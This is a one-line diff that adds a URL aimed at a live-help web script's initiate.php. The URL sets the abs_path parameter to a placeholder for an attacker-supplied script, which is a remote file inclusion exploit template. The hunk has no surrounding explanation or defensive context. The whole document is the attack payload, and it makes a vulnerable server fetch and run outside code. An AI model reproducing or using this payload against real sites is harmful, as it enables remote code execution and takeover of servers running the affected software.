@@ -1,0 +1,1 @@
+http://www.example.com/[livehelperpath]/initiate.php?abs_path=[evil_scripts]
